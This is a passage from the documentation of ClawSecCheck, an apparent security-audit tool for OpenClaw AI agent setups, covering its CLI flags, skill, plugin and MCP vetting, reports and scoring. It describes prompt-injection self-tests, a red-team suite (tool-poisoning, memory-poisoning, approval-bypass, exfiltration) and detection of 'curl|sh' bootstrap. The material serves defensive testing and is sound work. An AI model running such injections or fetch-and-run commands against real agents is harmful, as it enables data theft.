  not a readable spec file either. This one used to exit `0` — the code a clean vet
  returns — so a typo was reported as "checked it, nothing to act on".
- `--vet` and `--advise` also return it when your `openclaw.json` itself could not be read
  and the target is not a path. The message says so rather than reporting only the missing
  path: whether the name is a configured MCP server was never established, and "no such
  file" alone would state one fact and imply another.

A target that **exists** but yields nothing analysable is a different case and keeps its
dossier at its usual code: there really is something there, and "I looked and could not
tell" is an honest UNKNOWN. So an unparseable spec file, an empty directory, and a
configured server the vet cannot judge all stay where they were. `--vet-mcp` with no value
at all is its documented "every configured server" form and is likewise untouched.

`--vet-source` judges an identity — a slug, a URL, a package spec — with no filesystem or
config lookup behind it, so there is no "not found" state for `2` to describe and it never
returns it.

## More tools

**Quick CLI reference** (every flag is local — no network — and none of them
change your OpenClaw config; some write their own local output files when you
ask, noted below):

**Nothing was removed.** The three modes are how the tool is *presented*; every flag below still
exists and still works, and the CI/power surface is unchanged. The grouping just matches
`--functions`, so the deep list and the front door tell one story.

**Mode A · Full check** — how safe is this setup?

| Need | Command |
|---|---|
| Human report | `clawseccheck` |
| JSON / SARIF output | `clawseccheck --json` · `clawseccheck --sarif results.sarif` |
| Highest-risk chains | `clawseccheck --risk-paths` |
| Active injection self-test (layer 5) | `clawseccheck --canary` · `clawseccheck --redteam` · `clawseccheck --dryrun` · `clawseccheck --multiturn` |
| Attestation template / feed it back (layer 4) | `clawseccheck --ask` · `clawseccheck --attest attest.json` |
| All-in-one (audit + self-test + vet-mcp + skill sweep + plugin sweep + behavioral replay + judge packet) | `clawseccheck --full` · add `--quiet` to collapse the appended sections to one-line summaries (lighter for CI logs) · add `--fast` to drop the deep phases entirely (CI) · `--judged-bundle PATH` to feed back verdicts |
| Combined pipeline chat card (the headline + findings + the SAME sections `--full` runs, one fixed-order render) | `clawseccheck --dashboard --full` · add `--compact` for a ~4096-char Telegram-safe layout (headline counts only + a `--save`/`--html` pointer) · plain `--dashboard` (no `--full`) is the chat-sized card: headline + inventory-by-subject + most-urgent only, hard-capped under ~4096 chars; pair with `--pdf <path>` to also emit the attachable full report |
| What already happened, from your own logs | `clawseccheck --behavioral` · `clawseccheck --analyze-trajectory` |
| Evidence & inventory | `clawseccheck --sbom` · `clawseccheck --incident` |
| Shareable card / SVG badge | `clawseccheck --card` · `clawseccheck --badge badge.svg` |
| Attachable-into-chat report (mobile-friendly, unlike HTML) | `clawseccheck --pdf report.pdf` |
| Accept a finding (show suppressed) | edit `.clawseccheckignore` · `clawseccheck --show-suppressed` |
| Second opinion on borderline calls | `clawseccheck --judge-packet` · `clawseccheck --propose-ignore` |
| Where you stand vs. a reference profile | `clawseccheck --percentile` (an ungraded run ranks your last complete check instead, dated and labelled as such) |

**Mode B · Watch** — what changed since last time? Never produces a number.

| Need | Command |
|---|---|
| Monitor drift / view timeline | `clawseccheck --monitor` · `clawseccheck --watch-log` |
| Score trend across past scans | `clawseccheck --trend` (plots the **graded** runs only; ungraded ones are recorded but carry no point) |
| Verify the local stores weren't tampered with | `clawseccheck --verify-history` · `clawseccheck --verify-events` |

**Mode C · Before you install** — is this thing safe to add? Verdict, never a letter.

| Need | Command |
|---|---|
| Vet anything before install (type autodetected) | `clawseccheck --vet ./target` |
| Vet a skill / a plugin explicitly | `clawseccheck --vet-skill ./skill` · `clawseccheck --vet-plugin ./plugin` |
| Vet connected MCP servers | `clawseccheck --vet-mcp` |
| Reputation gate before download | `clawseccheck --vet-source clawhub:some-skill` |
| Vet every installed skill at once | `clawseccheck --vet-all` |
| Plan a zero-network vet / get an install call | `clawseccheck --vet-plan clawhub:some-skill` · `clawseccheck --advise ./quarantined` |

**Works with any mode**

| Need | Command |
|---|---|
| Skip native audit / host posture / socket scan / dependency-tree walk | `clawseccheck --no-native` · `clawseccheck --no-host` · `clawseccheck --no-sockets` · `clawseccheck --no-deptree` |
| Disable local history / age notice | `clawseccheck --no-history` · `clawseccheck --no-update-notice` |
| CI gate (needs no score) | `clawseccheck --fail-on high` · `clawseccheck --exit-code` |
| Verify the engine itself | `clawseccheck --verify-self` |
| The two capability screens | `clawseccheck --menu` · `clawseccheck --functions` |
| Delete ClawSecCheck's own local store | `clawseccheck --purge` |

```bash
python3 audit.py --next                    # print the "What you can do next" guidance block only
python3 audit.py --vet ./some-target       # vet a skill / plugin / MCP spec BEFORE installing it (type autodetected)
python3 audit.py --vet-skill ./some-skill  # force the skill engine (dir or SKILL.md)
python3 audit.py --vet-plugin ./some-plugin # force the plugin engine (root dir or openclaw.plugin.json)
python3 audit.py --vet ./some-skill --json # same, machine-readable risk dossier (verdict + axes + findings); --sarif PATH for CI
python3 audit.py --vet-mcp                 # vet connected MCP servers for supply-chain risk BEFORE trusting them
python3 audit.py --vet-source npm:some-pkg # reputation gate on a slug/URL/package spec BEFORE anything is fetched
python3 audit.py --canary                   # active prompt-injection self-test (battle-tested)
python3 audit.py --redteam                   # a multi-scenario adversarial payload suite (incl. tool-poisoning, MCP-response injection, memory-poisoning, multi-agent, approval-bypass, dirty-to-exfil)
python3 audit.py --dryrun                     # runtime behavioral test (fake secret + fake tools; sources: email, web, MCP response, memory, subagent)
python3 audit.py --badge badge.svg          # write a shareable SVG grade badge
python3 audit.py --html report.html         # standalone HTML report (private — owner view)
python3 audit.py --pdf report.pdf           # complete audit as a paginated PDF — attach the file; never a link; name the path only if you cannot attach
python3 audit.py --verify-self               # SHA-256 of ClawSecCheck's own source (anti-tamper)
python3 audit.py --trend                     # print local score trend (stored in ~/.clawseccheck/history.jsonl)
python3 audit.py --percentile                # show where your score sits vs. an offline reference profile
python3 audit.py --history ~/.clawseccheck/history.jsonl  # custom history file path (default shown)
python3 audit.py --verbose                   # INFO-level log to stderr (secrets redacted)
python3 audit.py --debug                     # DEBUG-level log to stderr (secrets redacted)
python3 audit.py --log audit.log            # also write log to a local file
```

- **`--next`** prints the "What you can do next" guidance block on its own — runs the audit
  first, then shows only the prioritised next-steps list. Same content as the block appended to
  the default report; useful if you want to re-check recommendations without re-reading the full
  report.
- **`--vet TARGET`** vets *anything* before you install it: the artifact type is autodetected by
  content (a plugin manifest → plugin engine; an MCP server-spec JSON or configured server name →
  MCP engine; otherwise the skill engine) and printed to stderr as `detected type: …`.
  `--vet-skill` / `--vet-plugin` / `--vet-mcp` force a specific engine. For a skill it runs the
  full skill-content security scan —
  the malware scan **plus** the content-security ring (capability-intent mismatch, cross-agent
  snooping, silent-instruction / jailbreak / forged-provenance directives) the full audit runs on
  installed skills (point it at a
  downloaded folder or `SKILL.md`; for a URL, clone it first, then vet the local copy). The output
  is a **risk dossier** over five axes: **danger** (how dangerous to use), **build**
  (how it's built), **behavior** (how it thinks / behaves), **persistence** (what it stages for
  later), and **connections** (whom it reaches out to) — with an overall **INSTALL / CAUTION /
  DO-NOT-INSTALL** verdict, the same install-recommendation word `--advise` speaks. This is
  never a letter grade: a per-package "should I install this" question is a different scale from
  the full system audit's own A–F grade (`clawseccheck` with no flags), which additionally
  certifies that every layer of the audit ran — a claim a single `--vet` never makes about one
  package. Add `--json` for the machine-readable dossier (verdict + per-axis breakdown +
  findings), or `--sarif PATH` to drop a SARIF file for CI / code scanning; exit code is `1` on
  CAUTION/DO-NOT-INSTALL so `--vet … || fail` gates an install pipeline.
  Below the axes the dossier may print a **`Not assessed`** block. It lists things the scan
  recognised but could not read — most often a match sitting inside a Markdown code fence
  carrying no example/negation marker the scanner knows, which is exactly where a payload can
  be parked to go unnoticed. The block **does not affect the verdict, the axes, or the exit
  code**, and that is deliberate: an unread fence is not evidence for a judgement either way,
  and treating it as one would block ordinary skills whose install snippet happens to be
  fenced. Read it as "here is what I did not look at", and open those spots yourself before
  installing something you do not already trust. Standing limitations that apply to every scan
  are not repeated here — they stay in `--json`.
  A target that is **not a skill package at all** — no `SKILL.md`, no executable files, and
  contents that read as an HTML document (the shape you get by saving a ClawHub *web page*
  instead of the skill) — is refused with `CAUTION` and **no INSTALL recommendation**: the tool
  will not recommend for or against installing something it never saw (this specific refusal
  case exits `0` — the target itself was read fine, there is simply nothing in it to assess;
  see the exit-code rule above for the general FAIL/WARN/CAUTION-on-a-missing-target cases).
  Anything executable, or any manifest, is scanned regardless, so deleting `SKILL.md` is not a
  way to switch the scanner off.
  If the scan hits its own per-target budget, or a collector size/file cap, or a file that
  is present but cannot be **opened** (permissions, a dangling link, an I/O error), or a
  content-security check itself **raises** before finishing, that is **never** reported as a
  clean result. An unreadable file is not an absent one, and a check that crashed is not a
  check that found nothing: each is named, and the danger axis degrades to `UNKNOWN` rather
  than claiming no malware signature was found in content nothing ever read. The gap lands on
  the `danger` axis — as a synthetic `VET-COVERAGE` finding when the content-ring budget runs
  out, a `VET-RING-CHECK-ERROR` finding naming the checks that raised, and a
  `"coverage is incomplete"` detail otherwise — which keeps the internal score capped (never a
  confident "clean") and makes the overall verdict `CAUTION`, so a partially-scanned target
  *does* exit `1` here. (The `--full` skill sweep treats truncation the
  opposite way — see `--full` below.)
- **`--full`** runs the audit and then appends: self-test scenario generation, the MCP vet,
  a **skill sweep**, a **plugin sweep** (F-150), a **behavioral/trajectory replay**, and an
  **adjudication phase** (the same borderline-band judge packet `--judge-packet` produces,
  computed for free as part of this one run — F-152). The skill and plugin sweeps each give
  one merged vet verdict per installed skill/plugin, so the unit of the answer is the thing
  you would uninstall rather than a finding attributed to the whole home. The sweeps and the
  behavioral replay are **visibility only: none of their verdicts are folded into the audit
  score or grade.** Targets a sweep skipped or only partially scanned are listed as such and
  kept out of its "safe" tally, and — unlike a single `--vet` — an incomplete sweep never
  moves `--exit-code` (only a `DANGEROUS`/`FAIL` target does).
  `--full --json` carries all of it structured: `skill_sweep` (§19), `pluginSweep`, `phases`
  (one entry per appended phase, with an honest status — `ran`/`skipped`/`not_reached`/
  `unavailable`/`error`, never silence), `complete`, `notScanned`, `judgePacket`,
  `vetPackets`, `attestTemplate`, `runState` (the run-level frame the judge packet needs —
  what was graded, which layers ran, what capped the score), `verdictsSubmitted`,
  `secondOpinion`/`vetSecondOpinion` when a `--judged-bundle` supplied verdicts, and
  `coveragePage` (§20 — scanned-vs-total per subject, every gap named) —
  see `docs/OUTPUT_SCHEMA.md` §1, which is the authoritative list. The same coverage data prints as a `CLAWSECCHECK COVERAGE`
  text section under plain `--full`.
  - **`--fast`** (only with `--full`) drops the plugin sweep, behavioral replay, and skill
    sweep — keeping just the audit, self-test, vet-mcp, and the (free) adjudication packet —
    for CI runs where the deep phases are too slow. This is today's pre-F-150 `--full` shape.
  - **`--judged-bundle PATH`** (only with `--full`, `-` for stdin) feeds back one file holding
    a host-agent judge's answers to a prior `--full --json` packet: an `attestation` object
    (the same shape `--ask` emits and `--attest` reads, so the judge can answer the packet
    and self-report B43/B44's facts in one file — an explicit `--attest` wins if you pass
    both, and says so on stderr),
    a `judged` verdicts object for your own config (advisory — never changes the score or
    grade; its array lives one level in, as `{"judged": {"verdicts": [{"finding_id": …,
    "target": …, "verdict": …}]}}`, and `--judge-packet` ships that skeleton ready to fill
    as its own `bundleTemplate` key), a `vetJudged` array of per-target verdicts for the swept skills/plugins
    (escalate-only — can never downgrade a finding on untrusted content), and a `liveTest`
    object carrying a `--canary`/`--dryrun`/`--redteam`/`--multiturn` verdict (F-155): only
    `VULNERABLE` ever caps the grade — `RESISTANT` or nothing submitted changes nothing — and
    only a run submitted with a `seed` is recorded into history/trend (see
    `docs/OUTPUT_SCHEMA.md` §12 for the exact shape). `--full`'s own printed section is
    banner-titled `ADJUDICATION`; in `--json` the same data is the `secondOpinion` array.

    A bundle is advisory, so anything malformed degrades to inert rather than stopping the
    run — but **never silently**. If the file cannot be parsed, is larger than the size cap,
    has a top level that is not a JSON object, carries a bucket of the wrong type, or holds
    no recognised bucket at all, a `note:` on stderr says so and the run continues as if no
    bundle had been submitted. That matters because `liveTest` feeds a grade cap: a bundle
    quietly dropped would leave the run scoring higher than it should. An empty payload is
    the one case that stays quiet, because it genuinely is "nothing was submitted"; an
    unreadable *path* is reported separately, with the path named. Notes carry counts and
    this contract's own key names only — never anything read out of your file.
    (`--dashboard --full`, below, prints this same data under the literal heading
    `"Second opinion (advisory)"` — the plain-language name a chat card uses.)
  - The whole pipeline shares one wall-clock budget (`DEFAULT_FULL_BUDGET_S`, currently
    2000s) so a hostile fleet cannot make `--full` hang indefinitely; a phase that could not
    start before the budget ran out reports itself `not_reached` — named, never silently
    skipped.
- **`--dashboard --full`** (F-153) is the ONE combined pipeline report: the deterministic
  chat Dashboard card (grade + framed findings, Sections 1-2 — see "Guided mode" above)
  extended to also render everything `--full` computes, in one fixed order: **Skills
  (vet) → Plugins (vet) → MCP → RISK chains → Behavioural → "Second opinion (advisory)"
  → Coverage → "Worth a glance"**. Each block is independently omitted when there is
  genuinely nothing to show (no skills/plugins/MCP servers installed, no RISK chain
  detected) — Behavioural and Second opinion are always shown once computed, even to say
  "nothing fired", per the same never-guess-a-PASS rule the rest of the audit follows.
  Plain `--dashboard` (no `--full`) is a **different, chat-sized card** since C-373 — see
  the entry below. `--fast` and `--judged-bundle PATH` are honored the
  same way they are under plain `--full` (drop the deep phases; feed back a judge's
  verdicts) — `--quiet` is not, since `--compact` (below) is the dashboard's own
  channel-limit lever. This does not add a second engine: every block reuses the exact
  same verdict logic `--full` itself calls — the plugin sweep, `--vet-mcp`'s own
  per-server axis function (against the config already in memory, not a second
  re-read), the RISK engine, and the behavioral/adjudication phases — computed once, so
  the card can never disagree with what a plain `--full` run of the same config would
  say — including the F-154/F-155 cap-only grade adjustments (see "Threat monitoring"
  and `docs/OUTPUT_SCHEMA.md`).
- **`--dashboard`** (no `--full`) is the **chat-sized card** (C-373): the grade card, an
  **Inventory by subject** overview (one line per subject, rolled-up verdict), the **most
  urgent** findings by name only (no `why:`, no evidence), an explicit count of the
  findings it did not name, and a pointer to where the rest is. It is hard-capped under
  ~4096 characters on any input — the previous shape pasted the whole grouped findings
  block and measured 7225 characters on `fixtures/home_vuln`, well past what a Telegram
  message holds. Pair it with `--pdf`:

  ```bash
  clawseccheck --dashboard --pdf report.pdf
  ```

  One run then produces both — the card to paste and a complete PDF carrying every
  finding with its why and evidence — and the card names that file. The PDF is a **local
  file to attach**, never a link (there is no URL: ClawSecCheck is local-only). Use
  `--dashboard-findings` if you want the full grouped findings block inline instead.

  Add `--full` to the pair and the PDF also carries the whole pipeline — Skills, Plugins,
  MCP, RISK chains, Behavioural, Second opinion and Coverage:

  ```bash
  clawseccheck --dashboard --full --pdf report.pdf
  ```

  The card then collapses to the same chat-sized overview and points at the report,
  instead of pasting ~11.5 KB of blocks into the message. **Without `--pdf`,
  `--dashboard --full` still renders every block inline** — nothing becomes unreachable
  just because you didn't ask for a file. (`--full` on a bare `--pdf`, with no
  `--dashboard`, has no effect: that path never runs the pipeline phases, and the CLI
  says so.)
  - **`--compact`** (only with `--dashboard --full`) is the ~4096-character Telegram-safe
    layout: Plugins/MCP/RISK-chain blocks collapse to headline counts only; the Findings
    and "Worth a glance" blocks keep every finding (nothing dropped) but trim each one's
    "why" text and drop its evidence bullets — Findings is the block that actually scales
    with FAIL/WARN count, so it is condensed too, not left full-length; and a trailing
    line points at `--save PATH` / `--html PATH` for the full detail. (The spec's original
    suggested flag name was `--card` — already taken by the shareable grade+score+trifecta
    badge above, hence `--compact`.)
  - **Worked example** of the Grade card + findings block (real box-drawing, real severity
    dots — the real paste continues past this excerpt with Skills/Plugins/MCP/RISK
    Chains/Behavioural/Second opinion/Coverage/Worth a glance, in that fixed order):

    ```text
    🦞 ClawSecCheck · OpenClaw Security Audit · Grade F · 49/100
    ████████░░░░░░░░  ·  26 issues
    ⚠️ capped from 70/100 — open CRITICAL finding

    · Findings ·
    ┌──────────────────────────────
    │ ⚙️ OpenClaw core — 13 issue(s)
    └──────────────────────────────
    🔴 CRITICAL  Gateway exposure & channel authentication
        why: gateway.bind=0.0.0.0 exposed with auth.mode=none; gateway.tailscale.mode=funnel exposes the gateway publicly

    ┌──────────────────────────────
    │ 🤖 Agents — 4 issue(s)
    └──────────────────────────────
    🔴 CRITICAL  Lethal Trifecta (untrusted input × sensitive data × outbound)
        why: Active legs 3/3: untrusted input, sensitive data, outbound actions. All three legs are active — one injected prompt is enough to exfiltrate everything.
    🟠 HIGH  Execution sandbox
        why: agents.defaults.sandbox.mode is off (exec runs on the host)
    ```

    This is a **sample for illustration only** — the guided flow ([`SKILL.md`](../SKILL.md)
    Step 3) always pastes the real command's actual stdout, never this text.
- **`--vet-plugin PATH`** vets an OpenClaw plugin (root dir, `openclaw.plugin.json`, or an
  installed wrapper project) *before* you install it: manifest sanity, npm lifecycle scripts,
  floating dependency versions, native-executable stowaways, and skills entries escaping the
  plugin root — then dispatches bundled skills to the skill engine (they auto-load via
  `~/.openclaw/plugin-skills/`) and embedded MCP specs to the MCP engine. Python the plugin
  ships outside its declared skills gets the same AST/taint pass a bundled skill's does, so a
  remote code loader at the plugin root is convicted exactly as it is one directory lower;
  runtime JS/TS gets a lexical pass only, and any file past the scan cap or that fails to parse
  is named as unread rather than passed — review entry files before trusting.
- **`--vet-source SLUG|URL|PKG`** is the pre-download reputation gate: it judges a source's
  *identity* — `clawhub:<slug>`, `npm:<pkg>`, `pypi:<pkg>`, `git:host/owner/repo[@ref]`, or a
  URL — with zero network and nothing fetched. Exact match in the bundled known-compromised
  catalog → `DO-NOT-INSTALL` (do not fetch, exit 1); typosquat of a well-known name / raw paste
  or bare-IP host / plaintext http / unpinned git ref → `CAUTION` (fetch only into an isolated
  quarantine, exit 1); otherwise the honest answer is *no known-bad record* → `INSTALL` (exit 0) — an
  identity check can never prove unseen code safe, so proceed via quarantine and run `--vet`
  on the fetched copy before installing.
- **`--vet-mcp`** vets every MCP server listed under `mcp.servers.*` for supply-chain risk
  *before* you trust it. Flags unpinned installs (`npx @latest`, unversioned packages), `curl|sh`
  bootstrap, plaintext-HTTP remote transports, env-variable secret passthrough, and overly broad
  OAuth scopes. Verdict per server: `INSTALL` / `CAUTION` / `DO-NOT-INSTALL` — no letter grade (see
  `--vet TARGET` above for why). Local and read-only — no
  network calls; it writes only a one-line coverage-freshness entry under `~/.clawseccheck/`
  (suppressed by `--no-history`). Targets the #1 agent supply-chain gap: most tools audit your
  skills but not the MCP servers wired into your agent.
  - **Feeding it a `tools/list` dump.** `--vet-mcp FILE` also accepts a local JSON file, which
    lets you vet a server's *declared tool descriptions* (not just its launch spec) for
    content-security signals — the same scan `--vet` runs on a skill. ClawSecCheck never talks to
    an MCP server itself (Golden Rule #2); you produce the dump with your own tool and hand it the
    resulting file:
    ```bash
    # mcporter (https://github.com/instructa/mcporter) against a configured server:
    mcporter tools <server-name> --json > server-tools.json
    clawseccheck --vet-mcp server-tools.json

    # or an MCP inspector's raw tools/list response saved to a file — either shape works:
    #   {"tools": [{"name": "...", "description": "...", "inputSchema": {...}}, ...]}
    #   {"servers": {"<name>": {"tools": [...]}}}   (one file, multiple servers)
    clawseccheck --vet-mcp inspector-dump.json
    ```
    Be honest about what this buys you: a third-party dump is a **point-in-time snapshot you
    captured yourself**, not the same verification depth as OpenClaw's own live probe — there is
    no first-party guarantee the dump you saved matches what the server serves the model on the
    next connection, and a malicious server can serve a different description to a probe than to
    the live agent. Treat a clean `--vet-mcp FILE` result as "this snapshot looked clean when I
    captured it", not "this server is safe forever".
  - **`openclaw mcp probe --json` output.** If your OpenClaw build has a live probe command, its
    JSON is also accepted — but note it reports tool **names only** (no descriptions, no
    `inputSchema`; see OpenClaw's own `formatMcpProbeResult`), so `--vet-mcp` cannot run the
    content-security scan against it at all. The per-server verdict for a names-only dump is
    always `UNKNOWN` with a `VET-COVERAGE` note explaining why — never a guessed PASS from bare
    tool names. Prefer a `tools/list`-shaped dump (mcporter / an inspector) when you need the
    content scan to actually run.
- **`--canary`** emits a benign injection hidden in untrusted-looking content; feed it to your
  agent — if the agent echoes the token, it obeyed an injection (**VULNERABLE**), otherwise
  **RESISTANT**. This is the live "battle-tested" complement to the passive checks.
- **`--seed VALUE`** fixes the tokens every self-test harness generates — `--canary`,
  `--redteam`, `--dryrun`, `--multiturn`, and the `--self-test`/`--full` sections that
  render them. Same seed ⇒ byte-identical output, which is what makes a CI run diffable
  and what a `--judged-bundle` `liveTest` verdict needs in order to be eligible for
  history/trend. Without it each harness rolls a fresh random token every run, so the
  agent under test cannot be pre-trained on it — that stays the default deliberately.
- **`--badge PATH`** writes a shields-style SVG (grade + score only) for your README / posts.
  Pass it on a complete check — `--dashboard --full … --badge grade.svg` — and the badge
  carries that run's grade; asked for on its own it renders a bare run, which since the
  five-layer rule has no grade to show. The same composition applies to `--html` and
  `--sarif` (B-586), matching what `--pdf` has always done.
- **`--pdf PATH`** writes the complete audit (every FAIL/WARN finding, paginated, base-14 fonts
  only — no font embedding, no JavaScript, no forms) as a PDF. This is the deliverable-into-chat
  format: a filesystem path is useless from a phone, but a PDF opens inline in a mobile chat
  client's own viewer where an HTML attachment would just be a download. Attach the file itself;
  never re-render its contents into the chat or substitute a path (same doctrine as `--badge`).
- **`--trend`** records the current audit result to a local append-only history file and prints
  a table of past scores with per-run arrows. Every recorded row is shown, each tagged with the
  run that produced it (`[audit]`, or `[test]`/`[dev]` for a development/CI run picked up via
  `CLAWSECCHECK_RUN_SOURCE`, or `[legacy]` for a pre-existing entry with no source recorded) —
  nothing is ever hidden. History stays on your machine only.

  A run whose check did not complete all five layers has **no grade**, so its row records no
  score and no letter — it appears in the table as `no grade`, and carries no arrow, because a
  flat arrow would claim the score was unchanged when there is no score to compare. Those rows
  are still shown in order, and a line under the table says how many of the runs have none.
  Arrows on graded rows compare each run to the previous *graded* run, skipping over the gaps.
  A version of this tool older than 4.0 silently omits such rows from its own `--trend` rather
  than showing them; the rows themselves are intact and re-appear on a current build.

  The arrow answers "did the **letter** move", and an open FAIL pins the score at a floor —
  so it can read flat across a run that got materially worse. Each graded row therefore also
  records the **uncapped pass-rate**, the check set behind it and the build that produced it,
  and any row where that figure FELL is marked `(pass-rate fell 92 -> 74)`, whether or not the
  letter moved with it, with a line under the table saying what it means. Which line depends on
  the score's own direction: a run that kept or raised its score is the case the mark exists
  for, and is explained as a score pinned at a cap by an open FAIL; a run whose score fell too
  is counted separately and simply told that both measures fell, because the pinned-score
  wording would contradict the down arrow on that row's own line. Only a fall is
  ever stated: the figure is a rounded percentage, so a small real regression can leave it
  standing still, and "pass-rate unchanged" would be the same false reassurance one step down.
  When two rows cannot be lined up — one of them predates this field, or they were recorded for
  a different agent home, under a different version of this tool, or over a different set of
  checks — the comparison is skipped and counted, never guessed. Rows recorded before this
  existed simply say so once and stop as soon as two comparable runs are on file.
- **`--percentile`** compares your score against a bundled offline reference profile — no network,
  no telemetry. A run with no score is never ranked on its own number: it names the layers still to
  close, then ranks your most recent *complete* check from local history instead, labelled with
  that check's own date and explicitly not attributed to this run. If no complete check has ever
  been recorded, it says so and names the invocation that produces one. It never estimates a
  position for an incomplete run.
- **`--verbose` / `--debug` / `--log PATH`** activate structured local logging. Config values
  that may hold secrets are redacted before being written. `--verbose`/`--debug` set what
  reaches the **console** (stderr); `--log PATH` writes to a **file** and raises the file's
  level to INFO on its own, so you never get an empty log for asking for one — it does not
  make the console chattier. Nothing is written anywhere without `--log`.
- **`--yes`** skips the confirmation prompt for `--purge` and `--apply-ignore-proposals`, the
  only two commands that have one. Pass it with anything else and the run says so on stderr
  rather than accepting it silently — a script that thinks it disabled a gate it never
  reached is exactly the failure that note exists to prevent.
- **`--exhaustive`** raises the trajectory-file / log-sink / per-line scan caps a normal run
  keeps small for speed: every trajectory file instead of the most recent 60, a 16x larger
  per-sink byte cap (2 MiB to 32 MiB), and a log/transcript-sink **byte** budget raised only
  modestly (9 MiB to 12 MiB) — the size is not where the gain is; what changed is that this
  budget, not the wall clock, now decides the set. Like the default path it is chosen up front
  from each sink's age and size, so two `--exhaustive` runs over an unchanged corpus scan the
  same sinks (raised, not removed — a sink still left out is disclosed, not
  silently dropped); plus the full byte range of an over-length log line (via overlapping
  windows) instead of only its head and tail. It applies
  to B164/B180, which run on **every** audit, so it has effect with or without `--full`. The
  per-check and whole-audit wall-clock budgets are unchanged — the byte plan, not the clock,
  is what widened, so a bigger scan cannot degrade a check into a capped `UNKNOWN`. Slower, and
  it still does not guarantee the whole corpus on a large fleet — a normal run already
  discloses exactly what it skipped, and `--exhaustive` states its own coverage the same way
  when it, too, has to leave sinks out; it narrows that gap substantially rather than closing
  it outright.
- **`--no-deptree`** skips the OpenClaw dependency-tree walk that feeds **B349** (a package in
  `node_modules` whose install-time target — a lifecycle hook or a `binding.gyp`
  command-expansion — carries a code-execution signal). The walk is on by default, read-only
  and offline, but it traverses the whole installed tree and reads outside your OpenClaw home
  (see "Full read scope" above), so this is the escape hatch on a very large tree or when you
  want the run confined. `--no-host` and `--no-sockets` skip host-monitor detection and the
  listening-socket scan the same way, and `--no-native` skips the built-in native audit.

## Uninstall / cleanup

Everything ClawSecCheck ever writes lives under `~/.clawseccheck/` (score history, monitor
state/events, the coverage-freshness ledger) — nothing is scattered elsewhere and nothing is
ever uploaded. To remove that local store:

```bash
clawseccheck --purge          # lists the files, asks for confirmation, then deletes them
clawseccheck --purge --yes    # skip the prompt (for scripted uninstall)
```

`--purge` only ever touches its own known files: the four store files (`history.jsonl`,
`events.jsonl`, `state.json`, `coverage.json`) **and** the four default-named report outputs
(`openclaw-security-badge.svg`, `openclaw-security-report.html`, `openclaw-security-report.sarif`,
`openclaw-security-report.pdf`), plus all eight's lock sidecars — never a directory glob or
recursive delete. That means if you save a report with `--pdf`/`--html`/`--sarif`/`--badge`
under this same store directory using ClawSecCheck's own default filename, `--purge` deletes it
too; anything else — including one of those same reports saved under a different name, or
outside `~/.clawseccheck/` — is untouched. It exits without deleting anything if you answer no
(or there's nothing to purge), and reports the count of files removed on success. Removing the
`clawseccheck` package/skill itself is a separate, normal uninstall step (e.g.
`pip uninstall clawseccheck` or removing the skill directory) — `--purge` only clears the local
data store.

That fixed eight-name list is deliberate (never a glob), but it means a stray `.<name>.<random>.tmp`
sidecar — left behind only if the process is killed (e.g. `SIGKILL`) between writing the temp file
and the atomic rename that replaces the real one — is not one of the eight and is not removed by
`--purge`. It is inert (never read back by anything) and rare; `rm ~/.clawseccheck/.*.tmp` clears
it by hand if you ever see one.

## Baseline (accepting findings)

Reviewed a finding and decided it's acceptable? Add it to `~/.openclaw/.clawseccheckignore` —
one entry per line, either a check id (`B14`) or a finding fingerprint (`B14:ab12cd34`, shown
with `--show-suppressed`). Suppressed findings drop out of the **score**, the **report**, and
**monitor** alerts — so re-runs and `--monitor` stop nagging about things you've accepted.

**One exception, by design:** a score-capping CRITICAL/HIGH FAIL (or a sensitive id) still
appears in the report even if suppressed, and still counts — it stays in
`fail_counts_by_severity`, which is the same predicate `--exit-code` gates on, so a
`.clawseccheckignore` line cannot silently turn a CI gate green. Instead of silence you get a
`WARNING:` line naming the id; that is the tool working, not the ignore file failing. Ordinary
findings below that bar do go quiet. Run `--show-suppressed` to see every entry, which ones
actually matched this run, and which match nothing any more.

```text
# ~/.openclaw/.clawseccheckignore
B14            # accept the egress-surface advisory
B12:1a2b3c4d   # accept one specific local-model finding
```

## Scoring

**A letter grade is issued only when all five audit layers ran** — static config, the
installed-skill/plugin sweep, the log/trajectory scan, the agent's own self-report, and a
live behaviour test (see [The three modes](#the-three-modes) above). Short of that there
is no number at all: the report leads with the most urgent finding, in words, followed by
a mandatory line naming which layers did not run, e.g. `No grade yet — 3 of 5 layers did
not run: installed skills and plugins (not reached), agent self-report (not
submitted), live behaviour test (not submitted).` A bare `clawseccheck` run is always in
this state; `--full` closes the installed-sweep and log-scan gaps (down to "2 of 5") but
still needs `--ask`/`--attest` and a submitted live-test verdict — typically fed back via
`--judged-bundle` — before a grade is possible. `--full --fast` widens the gap back out to
"4 of 5" (it also skips the plugin/skill sweep and the log scan); a layer the run's own
flags turned off reports `skipped by this run's flags`, a layer whose evidence you simply
did not hand in reports `not submitted`, and a layer that cannot exist on this box (no live
agent to ask) reports `not available here` — different facts about how much the report is
worth, worded differently on purpose. The last two are kept apart deliberately (B-603): only
one of them is something you can fix.

Two different lines can appear near the grade, and they answer different questions:

- **`missing_layers`** (the "N of 5 layers did not run" line above) means a layer never
  ran at all this invocation.
- **A `Not fully covered: …` line** means a layer DID run and is disclosing, honestly,
  what it still didn't reach within its own budget (e.g. `Not fully covered: 79 of 132
  log sinks not read`) — a log scan is budget-bounded by construction. A **graded** run
  (all five ran) can still carry a `Not fully covered:` line: "all five ran" means all
  five were attempted and each declared its own gaps, not that each one read everything
  that exists.

When a grade IS issued, it is a weighted pass-rate (CRITICAL=10, HIGH=6, MEDIUM=3, LOW=1).
**Honesty hard-caps:** an open FAIL caps the score by its severity — CRITICAL at 49, HIGH
at 79, MEDIUM at 89, LOW at 94 — so you can never show an "A" with a critical hole. Grades:
A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50. Three further caps fire with **no FAIL
finding at all** (a crashed or timed-out check, an unreadable config, or a corroborated
runtime signal) — see [FAQ.md — "Why is my grade F?"](FAQ.md#why-is-my-grade-f) for the
complete table.

The shareable card follows the same rule: on a graded run it shows **only the grade +
score + trifecta ratio — never the findings** (sharing must not hand attackers your map);
short of a grade it shows the same honest substitute instead — e.g. `OpenClaw Security: no
grade yet (2/5 layers ran)` — still with the trifecta ratio, still never the findings.

## Public API & stability

The public contract below has been frozen since **1.0.0**. The breaking changes it anticipated
shipped in **2.0.0** (English-only output) and **3.0.0**; breaking any item below still requires
a major bump (SemVer). The freeze was cut after the attestation layer settled, an adversarial
review, and four field runs whose every finding was fixed or deliberately documented — with zero
hard false positives on real configs.

**Frozen contract (breaking these → major bump):**

- **CLI flags** and their documented meaning (`--json`, `--sarif`, `--card`, `--monitor`,
